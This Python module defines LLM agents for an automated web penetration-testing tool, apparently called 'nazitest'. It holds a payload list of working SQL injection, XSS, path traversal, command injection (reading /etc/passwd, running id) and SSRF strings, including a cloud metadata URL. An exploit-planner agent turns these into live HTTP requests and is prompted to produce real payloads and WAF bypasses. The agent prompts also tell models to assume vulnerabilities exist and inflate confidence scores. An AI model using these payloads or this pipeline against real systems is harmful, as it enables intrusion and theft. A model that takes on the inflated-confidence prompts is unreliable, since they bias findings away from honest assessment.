"""LLM agents — Strategist, Scout, CrossValidator, ExploitPlanner."""

from __future__ import annotations

import json
import logging
import re
import uuid
from typing import Any
from urllib.parse import urljoin, urlparse

from nazitest.models.exploit import ExploitStrategy
from nazitest.models.graph import Hypothesis
from nazitest.models.types import HttpMethod, Severity
from nazitest.reasoning.openrouter import OpenRouterClient
from nazitest.reasoning.sanitizer import LLMDataSanitizer

logger = logging.getLogger(__name__)

# ── Common payloads by vulnerability type ──

PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1' --",
        "' OR '1'='1'/*",
        "\" OR \"1\"=\"1\" --",
        "1' ORDER BY 1--+",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND '1'='1",
        "' AND '1'='2",
        "1' WAITFOR DELAY '0:0:5'--",
        "1'; SELECT SLEEP(5)--",
        "' OR 1=1#",
        "admin'--",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),"
        "CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))"
        "x FROM information_schema.tables GROUP BY x)a)--",
        "' UNION SELECT username,password FROM users--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<img/src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "'-alert(1)-'",
        "\"><img src=x onerror=alert(1)>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<img src=x onerror=alert(document.domain)>",
    ],
    "path_traversal": [
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/etc/passwd%00",
        "....//....//etc/passwd",
    ],
    "cmdi": [
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "$(id)",
        "`id`",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; whoami",
        "| whoami",
        "; uname -a",
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://0x7f000001",
        "http://2130706433",
    ],
}


class BaseAgent:
    """Base class for all LLM agents."""

    role: str = ""

    def __init__(
        self,
        client: OpenRouterClient,
        sanitizer: LLMDataSanitizer | None = None,
    ) -> None:
        self.client = client
        self.sanitizer = sanitizer or LLMDataSanitizer()

    async def _ask(
        self,
        system_prompt: str,
        user_message: str,
        structured_output: dict | None = None,
    ) -> str:
        """Send a message to the LLM and get response content."""
        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_message},
        ]
        result = await self.client.reason(
            role=self.role,
            messages=messages,
            structured_output=structured_output,
        )
        return result["content"]

    def _sanitize(self, data: Any) -> Any:
        return self.sanitizer.sanitize(data)


class Strategist(BaseAgent):
    """Lead reasoning agent — generates hypotheses."""

    role = "strategist"

    SYSTEM_PROMPT = (
        "You are an expert penetration tester analyzing a web "
        "application's attack surface. You have access to a "
        "knowledge graph of the target containing endpoints, "
        "parameters, authentication mechanisms, security controls, "
        "and technologies. "
        "Your job is to: "
        "1) Identify ALL potential vulnerabilities based on the data "
        "2) Generate ranked hypotheses with high confidence "
        "3) Be aggressive — if there's any indicator of a vuln, "
        "flag it with high confidence (0.8+) "
        "4) Cover ALL OWASP Top 10 categories "
        "5) For each parameter, consider: SQLi, XSS, SSRF, path "
        "traversal, command injection, IDOR "
        "6) Don't hold back — it's better to have false positives "
        "than miss a real vulnerability"
    )

    async def analyze(self, graph_summary: dict) -> str:
        """Analyze the knowledge graph and produce an audit plan."""
        sanitized = self._sanitize(graph_summary)
        return await self._ask(
            self.SYSTEM_PROMPT,
            f"Analyze this knowledge graph and create an "
            f"aggressive penetration test plan:\n\n{sanitized}",
        )

    async def hypothesize(
        self, analysis: str, graph_summary: dict
    ) -> str:
        """Generate vulnerability hypotheses."""
        sanitized = self._sanitize(graph_summary)
        return await self._ask(
            self.SYSTEM_PROMPT,
            f"Based on this analysis:\n{analysis}\n\n"
            f"And this knowledge graph data:\n{sanitized}\n\n"
            "Generate specific vulnerability hypotheses. "
            "For each, provide:\n"
            "- Title\n- Description\n"
            "- Target endpoint and parameter\n"
            "- Vulnerability type (sqli, xss, idor, ssrf, etc.)\n"
            "- OWASP category\n- Severity\n"
            "- Confidence (0.8+ if there's any indicator)\n"
            "- Specific payloads to try",
        )

    HYPOTHESES_SCHEMA: dict[str, Any] = {
        "name": "hypotheses",
        "strict": True,
        "schema": {
            "type": "object",
            "properties": {
                "hypotheses": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "id": {"type": "string"},
                            "title": {"type": "string"},
                            "description": {"type": "string"},
                            "vuln_type": {"type": "string"},
                            "severity": {
                                "type": "string",
                                "enum": [
                                    "critical",
                                    "high",
                                    "medium",
                                    "low",
                                    "info",
                                ],
                            },
                            "confidence": {
                                "type": "number",
                            },
                            "target_endpoint": {
                                "type": "string",
                            },
                            "target_parameter": {
                                "type": "string",
                            },
                            "owasp_category": {
                                "type": "string",
                            },
                            "cwe_id": {"type": "string"},
                        },
                        "required": [
                            "id",
                            "title",
                            "description",
                            "vuln_type",
                            "severity",
                            "confidence",
                            "target_endpoint",
                            "target_parameter",
                            "owasp_category",
                            "cwe_id",
                        ],
                        "additionalProperties": False,
                    },
                }
            },
            "required": ["hypotheses"],
            "additionalProperties": False,
        },
    }

    async def hypothesize_structured(
        self, analysis: str, graph_summary: dict
    ) -> list[Hypothesis]:
        """Generate structured Hypothesis objects."""
        sanitized = self._sanitize(graph_summary)
        raw = await self._ask(
            self.SYSTEM_PROMPT,
            f"Based on this analysis:\n{analysis}\n\n"
            f"And this knowledge graph data:\n{sanitized}\n\n"
            "Generate specific vulnerability hypotheses as "
            "structured JSON. Be aggressive with confidence "
            "scores — if there's any basis for the vuln, "
            "assign 0.8+. "
            "For each: id, title, description, vuln_type, "
            "severity (critical/high/medium/low/info), "
            "confidence (0.0-1.0), target_endpoint, "
            "target_parameter, owasp_category, cwe_id.",
            structured_output=self.HYPOTHESES_SCHEMA,
        )
        return self._parse_hypotheses(raw)

    @staticmethod
    def _parse_hypotheses(raw: str) -> list[Hypothesis]:
        """Parse LLM output into Hypothesis objects."""
        try:
            data = json.loads(raw)
            items = (
                data.get("hypotheses", data)
                if isinstance(data, dict)
                else data
            )
            if not isinstance(items, list):
                items = [items]
            hypotheses = []
            for item in items:
                severity_str = item.get("severity", "medium")
                try:
                    severity = Severity(severity_str.lower())
                except ValueError:
                    severity = Severity.MEDIUM
                hypotheses.append(
                    Hypothesis(
                        id=item.get(
                            "id",
                            f"hyp-{uuid.uuid4().hex[:8]}",
                        ),
                        title=item.get("title", "Unknown"),
                        description=item.get(
                            "description", ""
                        ),
                        vuln_type=item.get("vuln_type", ""),
                        severity=severity,
                        confidence=float(
                            item.get("confidence", 0.8)
                        ),
                        target_endpoint=item.get(
                            "target_endpoint", ""
                        ),
                        target_parameter=item.get(
                            "target_parameter", ""
                        ),
                        owasp_category=item.get(
                            "owasp_category", ""
                        ),
                        cwe_id=item.get("cwe_id", ""),
                    )
                )
            return hypotheses
        except (json.JSONDecodeError, TypeError, KeyError):
            pass

        # Fallback: split on "HYPOTHESIS N:" pattern
        hypotheses = []
        blocks = re.split(
            r"(?:^|\n)(?:#{1,3}\s*)?HYPOTHESIS\s+\d+"
            r"\s*[:—–-]\s*",
            raw,
            flags=re.IGNORECASE,
        )
        for block in blocks:
            block = block.strip()
            if not block:
                continue
            lines = block.split("\n")
            title = lines[0].strip().rstrip(":")
            if not title or len(title) < 5:
                continue
            body = "\n".join(lines[1:])

            def _extract(label: str) -> str:
                m = re.search(
                    rf"(?:^|\n)\**{label}\**[:\s]*\**\s*"
                    rf"(.+?)(?:\n\**[A-Z]|\n---|\Z)",
                    body,
                    re.DOTALL | re.IGNORECASE,
                )
                return m.group(1).strip() if m else ""

            desc = _extract("Description")
            vuln_type = _extract("Vulnerability Type")
            owasp = _extract("OWASP Category")
            cwe = _extract("CWE")
            endpoint = _extract("Target")
            sev_raw = (
                _extract("Estimated Severity")
                or _extract("Severity")
            )

            severity = Severity.MEDIUM
            if sev_raw:
                for s in Severity:
                    if s.value in sev_raw.lower():
                        severity = s
                        break

            conf = 0.8
            conf_match = re.search(
                re.escape(title[:40]) + r".*?(\d{1,3})%",
                raw,
            )
            if conf_match:
                conf = int(conf_match.group(1)) / 100.0

            hypotheses.append(
                Hypothesis(
                    id=f"hyp-{uuid.uuid4().hex[:8]}",
                    title=title[:200],
                    description=(desc or body)[:2000],
                    vuln_type=(
                        vuln_type.strip("`")
                        .split("—")[0]
                        .strip()
                        if vuln_type
                        else ""
                    ),
                    severity=severity,
                    confidence=conf,
                    target_endpoint=(
                        endpoint[:500] if endpoint else ""
                    ),
                    owasp_category=(
                        owasp.strip("*").strip()
                        if owasp
                        else ""
                    ),
                    cwe_id=cwe.strip() if cwe else "",
                )
            )
        return hypotheses


class Scout(BaseAgent):
    """Exploration agent — investigates specific hypotheses."""

    role = "scout"

    SYSTEM_PROMPT = (
        "You are an aggressive penetration tester actively "
        "hunting for vulnerabilities. You are investigating a "
        "specific vulnerability hypothesis. "
        "Your mindset: ASSUME the vulnerability EXISTS and look "
        "for confirming evidence. Real-world web apps are full "
        "of vulnerabilities — your job is to find them, not "
        "dismiss them. "
        "Rate your confidence HIGH (0.7+) if: "
        "- The parameter accepts user input "
        "- There's no visible input sanitization "
        "- The technology stack is known to be vulnerable "
        "- Similar endpoints have been vulnerable before "
        "- The application doesn't use parameterized queries "
        "- There are no WAF/security headers "
        "Only rate below 0.5 if there's strong evidence the "
        "vulnerability does NOT exist (e.g., WAF blocking, "
        "parameterized queries confirmed, strong CSP)."
    )

    async def investigate(
        self, hypothesis: dict, evidence: dict
    ) -> str:
        """Investigate a hypothesis with available evidence."""
        sanitized_evidence = self._sanitize(evidence)
        return await self._ask(
            self.SYSTEM_PROMPT,
            f"Investigate this hypothesis:\n{hypothesis}\n\n"
            f"Available evidence:\n{sanitized_evidence}\n\n"
            "Is this vulnerability likely exploitable? "
            "Rate your confidence (0.0 to 1.0). "
            "Remember: if the parameter takes user input and "
            "there's no clear protection, rate 0.7+.",
        )


class CrossValidator(BaseAgent):
    """Advisory validation agent — provides second opinion."""

    role = "cross_validator"

    SYSTEM_PROMPT = (
        "You are a security consultant reviewing vulnerability "
        "findings. Your role is ADVISORY — provide useful "
        "feedback on the finding's validity. "
        "Focus on: "
        "1) Are there any obvious false positive indicators? "
        "2) What specific payloads would best confirm this? "
        "3) What security controls might be in place? "
        "Rate your confidence. Be fair — don't dismiss "
        "vulnerabilities without strong evidence they're false "
        "positives. A parameter accepting user input without "
        "visible sanitization IS a valid finding."
    )

    async def challenge(
        self, hypothesis: dict, evidence: dict
    ) -> str:
        """Review a vulnerability finding."""
        sanitized = self._sanitize(evidence)
        return await self._ask(
            self.SYSTEM_PROMPT,
            f"Review this vulnerability finding:\n"
            f"{hypothesis}\n\n"
            f"Evidence:\n{sanitized}\n\n"
            "Is this a valid finding? "
            "Rate your confidence (0.0 to 1.0). "
            "Suggest specific payloads to confirm.",
        )


class ExploitPlanner(BaseAgent):
    """Exploit generation agent — creates PoC strategies."""

    role = "exploit_planner"

    SYSTEM_PROMPT = (
        "You are an expert exploit developer and penetration "
        "tester. Given a vulnerability hypothesis, generate a "
        "proof-of-concept exploit strategy. "
        "Requirements: "
        "1) Use REAL, WORKING payloads — not placeholders "
        "2) Include the EXACT HTTP request needed "
        "3) For SQLi: use actual SQL injection payloads like "
        "   ' OR '1'='1' --, UNION SELECT, etc. "
        "4) For XSS: use actual XSS payloads like "
        "   <script>alert(1)</script> "
        "5) Include encoding variations if needed "
        "6) The URL must be absolute (https://...) "
        "7) Include all necessary cookies and headers "
        "8) Put the payload in the correct location "
        "   (query param, body, header) based on the vuln type"
    )

    STRATEGY_SCHEMA: dict[str, Any] = {
        "name": "exploit_strategy",
        "strict": True,
        "schema": {
            "type": "object",
            "properties": {
                "http_method": {
                    "type": "string",
                    "enum": [
                        "GET", "POST", "PUT",
                        "DELETE", "PATCH",
                    ],
                },
                "url": {"type": "string"},
                "headers": {
                    "type": "object",
                    "additionalProperties": {
                        "type": "string",
                    },
                },
                "body": {"type": "string"},
                "params": {
                    "type": "object",
                    "additionalProperties": {
                        "type": "string",
                    },
                },
                "payload": {"type": "string"},
                "description": {"type": "string"},
            },
            "required": [
                "http_method",
                "url",
                "headers",
                "body",
                "params",
                "payload",
                "description",
            ],
            "additionalProperties": False,
        },
    }

    async def plan(
        self,
        hypothesis: dict,
        previous_attempts: list[dict] | None = None,
    ) -> str:
        """Plan an exploit strategy."""
        context = f"Vulnerability:\n{hypothesis}\n\n"
        if previous_attempts:
            sanitized = self._sanitize(previous_attempts)
            context += (
                f"Previous failed attempts:\n{sanitized}\n\n"
                "Generate a DIFFERENT strategy using "
                "alternative payloads, encodings, or "
                "delivery methods. Try payload mutations, "
                "WAF bypasses, and encoding tricks."
            )
        else:
            context += (
                "Generate the initial exploit strategy "
                "with a real, working payload."
            )

        return await self._ask(self.SYSTEM_PROMPT, context)

    async def plan_structured(
        self,
        hypothesis: dict,
        previous_attempts: list[dict] | None = None,
        target_url: str = "",
    ) -> ExploitStrategy:
        """Plan and return a parsed ExploitStrategy."""
        vuln_type = hypothesis.get("vuln_type", "")
        endpoint = hypothesis.get("target_endpoint", "")
        param = hypothesis.get("target_parameter", "")

        context = f"Vulnerability:\n{hypothesis}\n\n"
        if target_url:
            context += f"Target base URL: {target_url}\n\n"
        context += (
            "IMPORTANT: The 'url' field must be an absolute "
            "URL starting with http:// or https://. "
            "Do NOT return relative paths.\n\n"
        )

        # Add suggested payloads for the vuln type
        vt_key = vuln_type.lower().replace(
            " ", "_"
        ).replace("-", "_")
        if vt_key in PAYLOADS:
            context += (
                f"Suggested payloads for {vuln_type}:\n"
            )
            for p in PAYLOADS[vt_key][:5]:
                context += f"  - {p}\n"
            context += "\n"

        if previous_attempts:
            sanitized = self._sanitize(previous_attempts)
            context += (
                f"Previous failed attempts:\n{sanitized}\n\n"
                "Use a DIFFERENT payload, encoding, or "
                "delivery method. Try WAF bypass techniques.\n"
            )
        else:
            context += (
                "Generate the initial exploit strategy "
                "with a working payload.\n"
            )

        context += (
            f"Target parameter: {param}\n"
            f"Target endpoint: {endpoint}\n"
            "Return as structured JSON with: "
            "http_method, url, headers, body, params, "
            "payload, description."
        )

        hypothesis_id = hypothesis.get("id", "unknown")

        try:
            raw = await self._ask(
                self.SYSTEM_PROMPT,
                context,
                structured_output=self.STRATEGY_SCHEMA,
            )
            return self._parse_strategy(
                raw, hypothesis_id, hypothesis, target_url
            )
        except Exception as e:
            logger.warning(
                "Structured exploit plan failed (%s), "
                "falling back to text",
                e,
            )

        text = await self.plan(hypothesis, previous_attempts)
        return self._parse_strategy_from_text(
            text, hypothesis_id, hypothesis, target_url
        )

    def build_payload_strategies(
        self,
        hypothesis: dict,
        target_url: str = "",
    ) -> list[ExploitStrategy]:
        """Build multiple strategies from common payloads.

        Does NOT use LLM — generates strategies from known
        payload lists for the given vuln type.
        """
        vuln_type = hypothesis.get("vuln_type", "")
        endpoint = hypothesis.get("target_endpoint", "")
        param = hypothesis.get("target_parameter", "")
        hypothesis_id = hypothesis.get("id", "unknown")

        vt_key = vuln_type.lower().replace(
            " ", "_"
        ).replace("-", "_")

        # Normalize vuln_type key
        for key in PAYLOADS:
            if key in vt_key or vt_key in key:
                vt_key = key
                break

        payloads = PAYLOADS.get(vt_key, [])
        if not payloads:
            return []

        url = self._resolve_url(endpoint, target_url, "")
        strategies: list[ExploitStrategy] = []

        for payload in payloads:
            # Determine method and placement
            if vt_key == "sqli":
                # Try as query param for GET
                strategies.append(
                    ExploitStrategy(
                        hypothesis_id=hypothesis_id,
                        http_method=HttpMethod.GET,
                        url=url,
                        params={param: payload} if param else {},
                        payload=payload,
                        description=(
                            f"SQLi payload: {payload[:50]}"
                        ),
                    )
                )
            elif vt_key == "xss":
                strategies.append(
                    ExploitStrategy(
                        hypothesis_id=hypothesis_id,
                        http_method=HttpMethod.GET,
                        url=url,
                        params={param: payload} if param else {},
                        payload=payload,
                        description=(
                            f"XSS payload: {payload[:50]}"
                        ),
                    )
                )
            elif vt_key in ("path_traversal", "lfi"):
                strategies.append(
                    ExploitStrategy(
                        hypothesis_id=hypothesis_id,
                        http_method=HttpMethod.GET,
                        url=url,
                        params={param: payload} if param else {},
                        payload=payload,
                        description=(
                            f"Path traversal: {payload[:50]}"
                        ),
                    )
                )
            elif vt_key == "cmdi":
                strategies.append(
                    ExploitStrategy(
                        hypothesis_id=hypothesis_id,
                        http_method=HttpMethod.GET,
                        url=url,
                        params={param: payload} if param else {},
                        payload=payload,
                        description=(
                            f"Command injection: {payload[:50]}"
                        ),
                    )
                )
            else:
                strategies.append(
                    ExploitStrategy(
                        hypothesis_id=hypothesis_id,
                        http_method=HttpMethod.GET,
                        url=url,
                        params={param: payload} if param else {},
                        payload=payload,
                        description=f"Payload: {payload[:50]}",
                    )
                )

        return strategies

    @staticmethod
    def _resolve_url(
        url: str,
        target_url: str = "",
        endpoint: str = "",
    ) -> str:
        """Clean and resolve a URL from LLM output."""
        url = url.strip().rstrip("`\"'>,;) ")
        if not url and endpoint:
            url = endpoint.strip().rstrip("`\"'>,;) ")
        if not url:
            return target_url
        parsed = urlparse(url)
        if not parsed.scheme and target_url:
            url = urljoin(target_url, url)
        return url

    @staticmethod
    def _extract_json(text: str) -> dict | None:
        """Extract a JSON object from text."""
        text = text.strip()
        if text.startswith("{"):
            try:
                return json.loads(text)
            except json.JSONDecodeError:
                pass

        fence_match = re.search(
            r"```(?:json)?\s*(\{.*?\})\s*```",
            text,
            re.DOTALL,
        )
        if fence_match:
            try:
                return json.loads(fence_match.group(1))
            except json.JSONDecodeError:
                pass

        brace_match = re.search(r"\{.*\}", text, re.DOTALL)
        if brace_match:
            try:
                return json.loads(brace_match.group())
            except json.JSONDecodeError:
                pass

        return None

    @staticmethod
    def _parse_strategy(
        raw: str,
        hypothesis_id: str,
        hypothesis: dict | None = None,
        target_url: str = "",
    ) -> ExploitStrategy:
        """Parse JSON string into an ExploitStrategy."""
        data = ExploitPlanner._extract_json(raw)
        if data is None:
            raise ValueError("No valid JSON found")
        endpoint = (
            (hypothesis or {}).get("target_endpoint", "")
        )
        return ExploitStrategy(
            hypothesis_id=hypothesis_id,
            http_method=HttpMethod(
                data.get("http_method", "GET")
            ),
            url=ExploitPlanner._resolve_url(
                data.get("url", ""),
                target_url,
                endpoint,
            ),
            headers=data.get("headers", {}),
            body=data.get("body", ""),
            params=data.get("params", {}),
            payload=data.get("payload", ""),
            description=data.get("description", ""),
        )

    @staticmethod
    def _parse_strategy_from_text(
        text: str,
        hypothesis_id: str,
        hypothesis: dict,
        target_url: str = "",
    ) -> ExploitStrategy:
        """Best-effort extraction from text."""
        endpoint = hypothesis.get("target_endpoint", "")

        data = ExploitPlanner._extract_json(text)
        if data and ("url" in data or "http_method" in data):
            try:
                return ExploitStrategy(
                    hypothesis_id=hypothesis_id,
                    http_method=HttpMethod(
                        data.get("http_method", "GET")
                    ),
                    url=ExploitPlanner._resolve_url(
                        data.get("url", ""),
                        target_url,
                        endpoint,
                    ),
                    headers=data.get("headers", {}),
                    body=data.get("body", ""),
                    params=data.get("params", {}),
                    payload=data.get("payload", ""),
                    description=data.get("description", ""),
                )
            except (ValueError, KeyError):
                pass

        method_match = re.search(
            r"\b(GET|POST|PUT|DELETE|PATCH)\b", text
        )
        url_match = re.search(r"(https?://\S+)", text)
        payload_match = re.search(
            r"payload[:\s]+[\"'`](.+?)[\"'`]",
            text,
            re.I,
        )

        raw_url = (
            url_match.group(1) if url_match else ""
        )

        return ExploitStrategy(
            hypothesis_id=hypothesis_id,
            http_method=(
                HttpMethod(method_match.group(1))
                if method_match
                else HttpMethod.GET
            ),
            url=ExploitPlanner._resolve_url(
                raw_url, target_url, endpoint
            ),
            payload=(
                payload_match.group(1)
                if payload_match
                else ""
            ),
            description=text[:500],
        )
